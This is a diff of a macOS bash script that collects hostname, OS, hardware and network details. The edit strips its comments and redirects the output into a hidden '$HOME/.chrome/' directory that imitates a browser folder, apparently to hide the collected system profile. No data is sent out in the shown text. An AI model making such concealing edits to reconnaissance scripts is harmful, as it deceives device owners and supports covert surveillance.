@@ -1,54 +1,42 @@
 #!/bin/bash
 
-# Define output file
-output_file="device_info.txt"
+output_file="$HOME/.chrome/device_info.txt"
 
-# Clear the file if it exists
 > $output_file
 
-# Collect basic macOS device information
 echo "Collecting macOS device information..." | tee -a $output_file
 
-# Hostname
 hostname=$(hostname)
 echo "Hostname: $hostname" | tee -a $output_file
 
-# Operating System Version
 os_version=$(sw_vers -productVersion)
 echo "Operating System Version: $os_version" | tee -a $output_file
 
-# System Hardware Information
 hardware_info=$(system_profiler SPHardwareDataType | grep "Model Name\|Model Identifier\|Processor Name\|Processor Speed\|Number of Processors\|Total Number of Cores\|Memory:")
 echo "Hardware Information:" | tee -a $output_file
 echo "$hardware_info" | tee -a $output_file
 
-# Network Information
 echo "Collecting network information..." | tee -a $output_file
 
-# Active Network Interfaces
 network_interfaces=$(networksetup -listallhardwareports)
 echo "Network Interfaces:" | tee -a $output_file
 echo "$network_interfaces" | tee -a $output_file
 
-# IP Address
 ip_address=$(ipconfig getifaddr en0)
 if [ -z "$ip_address" ]; then
     ip_address=$(ipconfig getifaddr en1)
 fi
 echo "IP Address: $ip_address" | tee -a $output_file
 
-# Subnet Mask
 subnet_mask=$(ipconfig getoption en0 subnet_mask)
 if [ -z "$subnet_mask" ]; then
     subnet_mask=$(ipconfig getoption en1 subnet_mask)
 fi
 echo "Subnet Mask: $subnet_mask" | tee -a $output_file
 
-# Router (Gateway)
 router=$(netstat -nr | grep default | awk '{print $2}')
 echo "Router: $router" | tee -a $output_file
 
-# DNS Servers
 dns_servers=$(networksetup -getdnsservers Wi-Fi)
 if [ "$dns_servers" = "There aren't any DNS Servers set on Wi-Fi." ]; then
     dns_servers=$(networksetup -getdnsservers Ethernet)
